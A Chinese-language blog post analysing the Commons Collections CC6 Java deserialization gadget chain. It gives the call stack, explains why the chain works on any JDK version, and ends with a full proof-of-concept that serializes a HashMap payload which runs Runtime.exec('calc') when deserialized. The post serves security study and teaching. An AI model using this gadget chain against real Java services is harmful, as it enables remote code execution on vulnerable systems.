---
layout: post
date: 2025-4-12
title: "CommonsCollections-CC6-最好的用的cc链-分析"
author: "XinYiSleep"
category: Java
---
<h1 id="n2cgu">一.基础信息</h1>

```java
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
        
堆栈
InvokerTransformer.transform
    ChainedTransformer.transform
        LazyMap.get
            TiedMapEntry.getValue
                TiedMapEntry.hashCode
                    HashMap.hash
                        HashMap.readObject
```
<h1 id="PiyFJ">二.眼熟的hashCode</h1>

```
这里可以看到标题为最好用的cc链为什么这样讲呢，因为cc6是不限制java版本的，为什么会这样呢？那你就要好好看下面文章学习了，
在cc1的时候我们得知了正版cc1走的是LazyMap.get,在cc6中后面这里也是一摸一样的下面我就去找get的调用，TiedMapEntry.getValue中调用了get，
这里只需要控制Map是LazyMap在构造方法中可以控制(图一),再去查找getValue,好运气是在当前类hashCode中调用了(图二)，这里为什么算是好消息呢？
就目前来说在当前文件调用不需要在去找了，最终要一个大家还记得HashMap这类吗？没错正是URLDNS链，这不就结合起来了吗，我们先目前情况模拟入口执行一下，
看下面代码。
```
```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke"
                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> o = new HashMap<>();
Map decorate = LazyMap.decorate(o, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "123");
tiedMapEntry.hashCode();
```
![](https://xinyisleep.github.io/img/2025/commons-collections6/1.png)

![](https://xinyisleep.github.io/img/2025/commons-collections6/2.png)

<h1 id="Vw09j">三.熟悉的链</h1>

```
上面我们知道我们需要找hashCode但是我们记得在URLDNS链中HashMap里面貌似存在调用了HashCode,最终HashMap.hash中调用了(图一)，
接着在入口类readObjec中调用了hash,下面我们构造一下exp下面代码,执行下面之后你会发现神马鬼怎么在序列化的时候执行了,
我们需要的是在反序列化执行因为入口点在反序列化里面，这里我很建议大家在这里的时候必须调试看看了不然真的很难理解，
不想断点看也没关系这里我就用文字来告诉大家到底发生了什么事情，没办法我就是体贴就是细狗，奥是细不是狗，这里其实和DNSURL链存在的问题非常相似，
我们执行put方法就是因为hash里面需要设置key,但是意外的是put里面也调用了hash导致提前执行了，
你想着提前执行就执行吧无所谓但是不巧的是LazyMap.get里面也有个put(图三)导致反序列化执行的时候containsKey发现里面有key(序列化第一次执行put添加的)直接false个球了所以执行不了，
好了上面就是原因了,到这里我们知道这个问题之后只需要破坏前面随便的内容不让他执行到LazyMap.get就行，在用反射修改就可以了，
这里有个坑你会发现你下断点的时候发现还没执行到objectObjectHashMap.put(tiedMapEntry, "456");就已经弹计算器了，
因为这里会执行toSting下面设置一下就欧克了(图四)。
```

```java
public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke"
                    , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    HashMap<Object, Object> o = new HashMap<>();
    Map decorate = LazyMap.decorate(o, chainedTransformer);
    TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "123");
    HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
    objectObjectHashMap.put(tiedMapEntry, "456");
    serialize(objectObjectHashMap);
```

![](https://xinyisleep.github.io/img/2025/commons-collections6/3.png)

![](https://xinyisleep.github.io/img/2025/commons-collections6/4.png)

![](https://xinyisleep.github.io/img/2025/commons-collections6/5.png)

![](https://xinyisleep.github.io/img/2025/commons-collections6/6.png)

<h1 id="hccyX">四.最终exp</h1>

```
到这里也就结束了,为什么cc6不限制JDK版本，其实讲到HashMap入口类就明白了，其实很简单啊，之前入口类都是走到JDK中了而HashMap并不依赖JDK 内部类。
```

```java
package com.example.cc6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class Cc6Application {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> o = new HashMap<>();
        Map decorate = LazyMap.decorate(o, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(o, "123");
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        objectObjectHashMap.put(tiedMapEntry, "456");
        Class<?> aClass = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
        Field map = aClass.getDeclaredField("map");
        map.setAccessible(true);
        map.set(tiedMapEntry,decorate);
        serialize(objectObjectHashMap);
        unserialize("ser.bin");
    public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }

}
```

